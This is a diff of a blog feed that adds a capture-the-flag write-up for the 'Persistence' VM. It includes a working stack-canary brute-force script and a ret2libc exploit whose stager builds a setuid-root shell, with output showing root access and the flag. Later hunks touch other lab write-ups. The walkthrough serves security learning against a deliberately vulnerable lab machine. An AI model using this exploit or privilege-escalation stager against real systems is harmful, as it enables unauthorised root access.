+<li><a href="http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/">The Art Of ELF: Analysis and Exploitations</a></li>
+<li><a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
+</ul>
+
+
+<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>
+
+<p>From <code>man 2 fork</code>&rsquo;s description:</p>
+
+<p>```bash fork man
+DESCRIPTION</p>
+
+<pre><code> Fork() causes creation of a new process.  The new process (child process) 
+ is an exact copy of the calling process (parent process) except for the 
+ following:
+</code></pre>
+
+<p> [.. snip ..]
+```</p>
+
+<p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>
+
+<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>
+
+<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) &ndash;> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>
+
+<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>
+
+<p>```bash Canary Brute Success Condition
+root@kali:~# telnet 127.0.0.1 3333
+Trying 127.0.0.1&hellip;
+Connected to 127.0.0.1.
+Escape character is &lsquo;^]&rsquo;.
+[+] hello, my name is sploitable
+[+] would you like to play a game?</p>
+
+<blockquote><p>A
+[+] yeah, I don&rsquo;t think so
+[+] bye!                           # &lt;&mdash; We have a bye!
+Connection closed by foreign host.</p></blockquote>
+
+<p>root@kali:~# telnet 127.0.0.1 3333
+Trying 127.0.0.1&hellip;
+Connected to 127.0.0.1.
+Escape character is &lsquo;^]&rsquo;.
+[+] hello, my name is sploitable
+[+] would you like to play a game?</p>
+
+<blockquote><p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[+] yeah, I don&rsquo;t think so
+Connection closed by foreign host. # &lt;&mdash; No bye!
+```</p></blockquote>
+
+<p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>
+
+<p>```python canary_brute.py
+import socket
+import sys</p>
+
+<p>payload = &ldquo;A&rdquo; * 30  # amount of bytes before the first canary bit is hit
+canary = &ldquo;&rdquo;         # the canary</p>
+
+<h1>start the canary brute loop. We want to brute 4 bytes &hellip;</h1>
+
+<p>for x in xrange(1,5):</p>
+
+<pre><code># ... and try all possibilities
+for canary_byte in xrange(0, 256):
+
+    # prepare the byte
+    hex_byte = chr(canary_byte)
+
+    # prepare the payload
+    send = payload + canary + hex_byte
+
+    print "[+] Trying: '\\x{0}' in payload '%s' (%d:%d/255)".format(hex_byte.encode("hex")) % (send, x, canary_byte)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(('127.0.0.1', 3333))
+
+    # get the inital banners
+    sock.recv(35)   # [+] hello, my name is sploitable\n
+    sock.recv(40)   # [+] would you like to play a game?\n
+    sock.recv(5)    # &gt;
+
+    # send the payload  
+    sock.send(send)
+    sock.recv(27)   # [+] yeah, I don't think so\n
+
+    # if we have a OK response, then we will have this last part
+    # as '[+] bye!\n' populated, if its wrong, not
+    data =  sock.recv(64)   # [+] bye!\n
+    if "bye" in data:
+        print "[!!] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
+        canary += hex_byte
+        sock.close()
+        break
+
+    sock.close()
+
+# if we cant even find the first byte, we failed already
+if len(canary) &lt;= 0:
+    print "[-] Unable to even find the first bit. No luck"
+    sys.exit(0)
+</code></pre>
+
+<p>if len(canary) > 0:</p>
+
+<pre><code>print "[+] Canary seems to be {0}".format(canary.encode("hex"))
+</code></pre>
+
+<p>else:</p>
+
+<pre><code>print "[-] Unable to brute canary"
+</code></pre>
+
+<p>```</p>
+
+<p>An example run of this would end as follows:</p>
+
+<p><code>bash Running canary_brute.py
+[+] Trying: '\x8d' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:141/255)
+[+] Trying: '\x8e' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:142/255)
+[+] Trying: '\x8f' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:143/255)
+[+] Trying: '\x90' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:144/255)
+[!!] Found a possible canary value of '90'!
+[+] Canary seems to be 00ef8d90
+</code></p>
+
+<p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>
+
+<h2>wopr &ndash; NX and EIP</h2>
+
+<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>
+
+<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>
+
+<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>
+
+<p>```bash ASLR check
+bash-4.1$ ldd /usr/local/bin/wopr</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
+libc.so.6 =&gt; /lib/libc.so.6 (0xb7e62000)
+/lib/ld-linux.so.2 (0x00110000)
+</code></pre>
+
+<p>bash-4.1$ ldd /usr/local/bin/wopr</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
+libc.so.6 =&gt; /lib/libc.so.6 (0xb7e62000)
+/lib/ld-linux.so.2 (0x00110000)
+</code></pre>
+
+<p>```</p>
+
+<p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>
+
+<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>
+
+<p>```bash finding system()
+bash-4.1$ export SHELL=/bin/bash</p>
+
+<p>bash-4.1$ gdb -q /usr/bin/telnet
+Reading symbols from /usr/bin/telnet&hellip;(no debugging symbols found)&hellip;done.
+Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
+(gdb) b *main   # set a breakpoint to stop the flow once we hit the main() func
+Breakpoint 1 at 0x7b90</p>
+
+<p>(gdb) r         # run the program
+Starting program: /usr/bin/telnet
+Breakpoint 1, 0x00117b90 in main ()</p>
+
+<p>(gdb) p system  # We hit our breakpoint, lets leak the address for system()
+$1 = {<text variable, no debug info>} 0xb7e56210 <system>
+(gdb)
+```</p>
+
+<p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>
+
+<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>
+
+<p>```text Stack after memory corruption up to EIP
+&ndash; &ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>           &ndash; ></p>
+
+<p>[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
+ ^~ Initial BF    ^~ Bruted cookie                    ^~ system()</p>
+
+<ul>
+<li>&ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>           &ndash; >
+```</li>
+</ul>
+
+
+<p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>
+
+<h2>wopr &ndash; code exec</h2>
+
+<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>
+
+<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>
+
+<p>I tried to put a command in a env variable and failed.<br/>
+I attempted to write a ROP chain and failed.</p>
+
+<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>
+
+<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>
+
+<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>
+
+<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>
+
+<p>```bash wopr strings
+root@kali:~/Desktop/persistence# strings  wopr
+/lib/ld-linux.so.2
+<strong>gmon_start</strong>
+libc.so.6
+_IO_stdin_used</p>
+
+<p>[.. snip ..]</p>
+
+<p>[^_]
+[+] yeah, I don&rsquo;t think so
+socket
+setsockopt
+bind
+[+] bind complete
+listen
+/tmp/log          # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+TMPLOG
+[+] waiting for connections
+[+] logging queries to $TMPLOG
+accept
+[+] got a connection
+[+] hello, my name is sploitable
+[+] would you like to play a game?
+[+] bye!
+```</p>
+
+<p>See that? Can you <strong>see</strong> that&hellip; We have <code>/tmp/log</code> RIGHT THERE!</p>
+
+<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>
+
+<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>
+
+<p>```bash finding /tmp/log
+root@kali:~# gdb -q ./wopr
+Reading symbols from wopr&hellip;(no debugging symbols found)&hellip;done.</p>
+
+<p>gdb-peda$ b *main
+Breakpoint 1 at 0x80487de</p>
+
+<p>gdb-peda$ r
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
+EAX: 0xbffff4a4 &mdash;> 0xbffff60a (&ldquo;wopr&rdquo;)
+EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
+ECX: 0x66a6f92e
+EDX: 0x1
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff478 &mdash;> 0x0
+ESP: 0xbffff3fc &mdash;> 0xb7e8ae36 (&lt;<strong>libc_start_main+230>:    mov    DWORD PTR [esp],eax)
+EIP: 0x80487de (<main>: push   ebp)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
+   0x80487d7 &lt;get_reply+99>:    call   0x804865c &lt;</strong>stack_chk_fail@plt>
+   0x80487dc &lt;get_reply+104>:   leave<br/>
+   0x80487dd &lt;get_reply+105>:   ret  <br/>
+=> 0x80487de <main>:    push   ebp
+   0x80487df &lt;main+1>:  mov    ebp,esp
+   0x80487e1 &lt;main+3>:  sub    esp,0x258
+   0x80487e7 &lt;main+9>:  mov    eax,DWORD PTR [ebp+0x8]
+   0x80487ea &lt;main+12>: mov    DWORD PTR [ebp-0x23c],eax
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
+0000| 0xbffff3fc &mdash;> 0xb7e8ae36 (&lt;__libc_start_main+230>:   mov    DWORD PTR [esp],eax)
+0004| 0xbffff400 &mdash;> 0x1
+0008| 0xbffff404 &mdash;> 0xbffff4a4 &mdash;> 0xbffff60a (&ldquo;wopr&rdquo;)
+0012| 0xbffff408 &mdash;> 0xbffff4ac &mdash;> 0xbffff629 (&ldquo;SSH_AGENT_PID=3171&rdquo;)
+0016| 0xbffff40c &mdash;> 0xb7fe08d8 &mdash;> 0xb7e74000 &mdash;> 0x464c457f
+0020| 0xbffff410 &mdash;> 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
+0024| 0xbffff414 &mdash;> 0xffffffff
+0028| 0xbffff418 &mdash;> 0xb7ffeff4 &mdash;> 0x1cf2c
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
+Legend: code, data, rodata, value
+Breakpoint 1, 0x080487de in main ()</p>
+
+<p>gdb-peda$ searchmem /tmp/log
+Searching for &lsquo;/tmp/log&rsquo; in: None ranges
+Found 2 results, display max 2 items:
+wopr : 0x8048c60 (&ldquo;/tmp/log&rdquo;)
+wopr : 0x8049c60 (&ldquo;/tmp/log&rdquo;)
+```</p>
+
+<p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>
+
+<h2>wopr &ndash; the exploit</h2>
+
+<p>To sum up what we have to do to exploit this, we can say that we have to:</p>
+
+<ul>
+<li>Provide a string of size 30</li>
+<li>Provide the canary we have brute forced</li>
+<li>Pad with 4 bytes</li>
+<li>Write EIP to the location of <code>system()</code></li>
+<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
+<li>Provide the location of <code>/tmp/log</code></li>
+</ul>
+
+
+<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>
+
+<p><code>text
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\xff\xff\xff\xff" + "AAAA" +
+"\x10\xc2\x16\x00" + "JUNK" + "\x60\x8c\x04\x08"
+</code></p>
+
+<p>I finished up coding the exploit, which eventually resulted in the following:</p>
+
+<p>```python Persistence Sploit
+import socket
+import sys
+import os</p>
+
+<p>payload = &ldquo;A&rdquo; * 30  # amount of bytes to before the canary is hit
+canary = &ldquo;&rdquo;     # canary that should update as its bruted</p>
+
+<p>print &ldquo;&rdquo;"</p>
+
+<pre><code>        A: "So, I heard you like pain...?"
+        B: "... a bit"
+        C: "Well, here it is, the: "
+</code></pre>
+
+<hr />
+
+<p>|    \ /  <em>]|    \  / </em><strong>/|    / </strong><em>/|      |  /  </em>]|    \   /  ]  /  <em>]
+|  o  )  [</em> |  D  )(   _  |  (   _ |      | /  [<em> |  _  | /  /  /  [</em>
+|   <em>/    </em>]|    /  _<em>  | |  |_</em>  ||<em>|  |</em>||    <em>]|  |  |/  /  |    </em>]
+|  | |   [<em> |    \  /  \ | |  |/  \ |  |  |  |   [</em> |  |  /   _ |   [<em>
+|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
+|<strong>| |</strong></em><strong>||</strong>|_|  _<strong>||</strong><strong>|_</strong>|  |<strong>|  |</strong><em><strong>||</strong>|<strong>|_</strong></em>||_____|</p>
+
+<pre><code>  _____ ____  _       ___  ____  ______ 
+ / ___/|    \| |     /   \|    ||      |
+(   \_ |  o  ) |    |     ||  | |      |
+ \__  ||   _/| |___ |  O  ||  | |_|  |_|
+ /  \ ||  |  |     ||     ||  |   |  |  
+ \    ||  |  |     ||     ||  |   |  |  
+  \___||__|  |_____| \___/|____|  |__|  
+
+            A: "AKA: FU superkojiman &amp;&amp; sagi- !!"
+            A: "I also have no idea what I am doing"
+</code></pre>
+
+<p>&ldquo;&rdquo;"</p>
+
+<p>print &ldquo;[+] Connecting &amp; starting canary brute force&hellip;&rdquo;</p>
+
+<h1>start the canary brute loop. We want to brute 4 bytes &hellip;</h1>
+
+<p>for x in xrange(1,5):</p>
+
+<pre><code># ... and try all possibilities
+for canary_byte in xrange(0, 256):
+
+    # prepare the byte
+    hex_byte = chr(canary_byte)
+
+    # prepare the payload
+    send = payload + canary + hex_byte
+
+    # connect and send payload
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(('127.0.0.1', 3333))
+
+    # get the inital banners
+    sock.recv(35)   # [+] hello, my name is sploitable\n
+    sock.recv(40)   # [+] would you like to play a game?\n 
+    sock.recv(5)    # &gt; 
+
+    # send the payload  
+    sock.send(send)
+    sock.recv(27)   # [+] yeah, I don't think so\n
+
+    # if we have a OK response, then we will have this last part
+    # as '[+] bye!\n' populated, if its wrong, not
+    data =  sock.recv(64)   # [+] bye!\n
+    if "bye" in data:
+        print "[+] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
+        canary += hex_byte
+        sock.close()
+        break
+
+    sock.close()
+# if we cant even find the first byte, we failed already
+if len(canary) &lt;= 0:
+    print "[-] Unable to even find the first bit of the canary. No luck"
+    sys.exit(0)
+</code></pre>
+
+<h1>The canary is our ticket out of here!</h1>
+
+<p>if len(canary) == 4:</p>
+
+<pre><code>print "[+] Canary known as : {0}".format(canary.encode("hex"))
+print "[+] Writing /tmp/log to be called by wopr later"
+
+# ./wopr has the string /tmp/log in it. We will use this as
+# our code exec point, overwriting whatever is in it atm
+stager = """
+    #!/bin/sh
+
+    # First, prepare a small C shell and move it to /tmp with name getroot
+    echo "int main(void)\n{\nsetuid(0);\nsystem(\\"/bin/sh\\");\nreturn 0;\n}" &gt; /tmp/getroot.c
+
+    # compile it
+    /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot
+
+    # change ownership and setuid
+    /bin/chown root:root /tmp/getroot
+    /bin/chmod 4777 /tmp/getroot
+"""
+
+# write the file
+with open('/tmp/log','w') as stager_file:
+    stager_file.write(stager)
+
+# make it executable
+os.chmod('/tmp/log', 0755)
+
+# now, with the stack canary known and the stager ready, lets corrupt
+# EIP and sploit!
+payload += canary               # canary we bruted
+payload += "A" * 4              # padding to EIP wich is at byte 42
+payload += "\x10\x62\xe5\xb7"   # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.
+payload += "JUNK"               # JUNK. Should probably do exit() here. Meh.
+payload += "\x60\x8c\x04\x08"   # location if /tmp/log string in .data
+
+# and connect &amp;&amp; send
+print "[+] Connecting to service"
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(('127.0.0.1', 3333))
+sock.recv(35)
+sock.recv(40)
+sock.recv(5)
+print "[+] Sending Payload"
+sock.send(payload)
+
+sock.recv(64)
+sock.close()
+print "[+] Done"
+
+print "[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)"
+os.system("/tmp/getroot")
+</code></pre>
+
+<p>else:</p>
+
+<pre><code>print "[!] Incomplete Canary. Can't continue reliably"
+</code></pre>
+
+<h1>done</h1>
+
+<p>```</p>
+
+<p>A sample run would be:</p>
+
+<p>```bash Running sploit.py
+bash-4.1$ ls -lah /tmp/sploit.py
+-rw-rw-r&mdash;. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
+bash-4.1$ python /tmp/sploit.py</p>
+
+<pre><code>        A: "So, I heard you like pain...?"
+        B: "... a bit"
+        C: "Well, here it is, the: "
+</code></pre>
+
+<hr />
+
+<p>|    \ /  <em>]|    \  / </em><strong>/|    / </strong><em>/|      |  /  </em>]|    \   /  ]  /  <em>]
+|  o  )  [</em> |  D  )(   _  |  (   _ |      | /  [<em> |  _  | /  /  /  [</em>
+|   <em>/    </em>]|    /  _<em>  | |  |_</em>  ||<em>|  |</em>||    <em>]|  |  |/  /  |    </em>]
+|  | |   [<em> |    \  /  \ | |  |/  \ |  |  |  |   [</em> |  |  /   _ |   [<em>
+|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
+|<strong>| |</strong></em><strong>||</strong>|_|  _<strong>||</strong><strong>|_</strong>|  |<strong>|  |</strong><em><strong>||</strong>|<strong>|_</strong></em>||_____|</p>
+
+<pre><code>  _____ ____  _       ___  ____  ______ 
+ / ___/|    \| |     /   \|    ||      |
+(   \_ |  o  ) |    |     ||  | |      |
+ \__  ||   _/| |___ |  O  ||  | |_|  |_|
+ /  \ ||  |  |     ||     ||  |   |  |  
+ \    ||  |  |     ||     ||  |   |  |  
+  \___||__|  |_____| \___/|____|  |__|  
+
+            A: "AKA: FU superkojiman &amp;&amp; sagi- !!"
+            A: "I also have no idea what I am doing"
+</code></pre>
+
+<p>[+] Connecting &amp; starting canary bruteforce&hellip;
+[+] Found a possible canary value of &lsquo;64&rsquo;!
+[+] Found a possible canary value of &lsquo;d3&rsquo;!
+[+] Found a possible canary value of &lsquo;c6&rsquo;!
+[+] Found a possible canary value of &lsquo;15&rsquo;!
+[+] Canary known as : 64d3c615
+[+] Writing /tmp/log to be called by wopr later
+[+] Connecting to service
+[+] Sending Payload
+[+] Done
+[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)
+sh-4.1# id
+uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+```</p>
+
+<p>And, as proof, we cat the flag!</p>
+
+<p>```bash Persistence w00t
+sh-4.1# cat /root/flag.txt</p>
+
+<pre><code>          .d8888b.  .d8888b. 888    
+         d88P  Y88bd88P  Y88b888    
+         888    888888    888888    
+</code></pre>
+
+<p>888  888  888888    888888    888888888
+888  888  888888    888888    888888  <br/>
+888  888  888888    888888    888888  <br/>
+Y88b 888 d88PY88b  d88PY88b  d88PY88b.<br/>
+ &ldquo;Y8888888P&rdquo;  &ldquo;Y8888P&rdquo;  &ldquo;Y8888P&rdquo;  &ldquo;Y888</p>
+
+<p>Congratulations!!! You have the flag!</p>
+
+<p>We had a great time coming up with the
+challenges for this boot2root, and we
+hope that you enjoyed overcoming them.</p>
+
+<p>Special thanks goes out to @VulnHub for
+hosting Persistence for us, and to
+@recrudesce for testing and providing
+valuable feedback!</p>
+
+<p>Until next time,</p>
+
+<pre><code>  sagi- &amp; superkojiman
+</code></pre>
+
+<p>```</p>
+
+<h2>conclusion</h2>
+
+<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>
+
+<h2>thats not all</h2>
+
+<p>There are however a few more things I&rsquo;d like to try.</p>
+
+<ul>
+<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
+<li>Modify the exploit to a working ROP payload</li>
+<li>Explore other avenues to break out of rbash</li>
+</ul>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[taming (actually just solving) the troll]]></title>
@@ -205,8 +1344,8 @@ Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak &ndash; for legal p
 <p>Yay <code>overflow:Pass.txt</code> should get us a session via ssh:</p>
 
 <p>```bash Tr0ll ssh
-root@kali:~/Desktop/Tr0ll# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#111;&#x76;&#x65;&#114;&#x66;&#x6c;&#111;&#119;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x35;&#x36;&#46;&#x31;&#x30;&#x31;">&#111;&#118;&#101;&#x72;&#x66;&#108;&#x6f;&#119;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#53;&#x36;&#46;&#49;&#48;&#x31;</a>
-<a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#111;&#118;&#101;&#114;&#x66;&#x6c;&#111;&#x77;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#53;&#54;&#x2e;&#49;&#48;&#x31;">&#111;&#x76;&#101;&#x72;&#x66;&#x6c;&#x6f;&#x77;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#x35;&#54;&#x2e;&#49;&#x30;&#49;</a>&rsquo;s password:
+root@kali:~/Desktop/Tr0ll# ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#111;&#118;&#101;&#114;&#x66;&#108;&#x6f;&#x77;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#53;&#54;&#x2e;&#x31;&#x30;&#x31;">&#111;&#118;&#x65;&#114;&#102;&#108;&#x6f;&#119;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#53;&#x36;&#x2e;&#x31;&#x30;&#x31;</a>
+<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#111;&#118;&#101;&#x72;&#102;&#108;&#111;&#x77;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#53;&#x36;&#46;&#49;&#48;&#x31;">&#x6f;&#x76;&#x65;&#x72;&#x66;&#x6c;&#x6f;&#x77;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#53;&#54;&#x2e;&#49;&#x30;&#49;</a>&rsquo;s password:
 Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)</p>
 
 <p>[&hellip;]</p>
@@ -407,7 +1546,7 @@ nc-data: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural</p>
 <p>And then a easy SSH in:</p>
 
 <p>```bash
-root@kali:~# ssh -i delacroix <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x64;&#x65;&#x6c;&#x61;&#99;&#114;&#x6f;&#x69;&#120;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#53;&#54;&#46;&#49;&#x30;&#50;">&#100;&#x65;&#108;&#97;&#x63;&#x72;&#111;&#105;&#120;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#x35;&#x36;&#46;&#x31;&#48;&#50;</a>
+root@kali:~# ssh -i delacroix <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x64;&#101;&#x6c;&#x61;&#x63;&#114;&#111;&#105;&#x78;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x35;&#x36;&#46;&#49;&#x30;&#50;">&#x64;&#x65;&#x6c;&#97;&#99;&#x72;&#111;&#x69;&#x78;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#53;&#54;&#46;&#49;&#48;&#x32;</a>
 The authenticity of host &lsquo;192.168.56.102 (192.168.56.102)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -767,7 +1906,7 @@ Starting program: /opt/bf &rdquo;$(python -c &lsquo;print &ldquo;>&rdquo;.join([
 <p>Breakpoint 1, 0x080486eb in main ()</p>
 
 <p>(gdb) x/x 0x08049a48
-0x8049a48 <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#112;&#114;&#105;&#110;&#x74;&#x66;&#64;&#x67;&#111;&#x74;&#x2e;&#112;&#x6c;&#x74;">&#112;&#114;&#105;&#110;&#116;&#102;&#64;&#x67;&#111;&#116;&#46;&#x70;&#108;&#116;</a>: 0x00000004
+0x8049a48 <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#x70;&#x72;&#x69;&#x6e;&#x74;&#102;&#x40;&#x67;&#111;&#116;&#x2e;&#112;&#x6c;&#116;">&#x70;&#114;&#105;&#x6e;&#116;&#102;&#x40;&#103;&#111;&#x74;&#x2e;&#112;&#108;&#116;</a>: 0x00000004
 (gdb)
 ```</p>
 
@@ -789,7 +1928,7 @@ Start it from the beginning? (y or n) y</p>
 H�                                                                                                                                                                                                               <br/>
 Breakpoint 1, 0x080486eb in main ()
 (gdb) x/x 0x08049a48
-0x8049a48 <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x70;&#x72;&#x69;&#x6e;&#x74;&#102;&#64;&#x67;&#x6f;&#x74;&#46;&#112;&#108;&#116;">&#112;&#114;&#105;&#x6e;&#116;&#x66;&#x40;&#x67;&#x6f;&#x74;&#x2e;&#x70;&#x6c;&#x74;</a>: 0x00002000
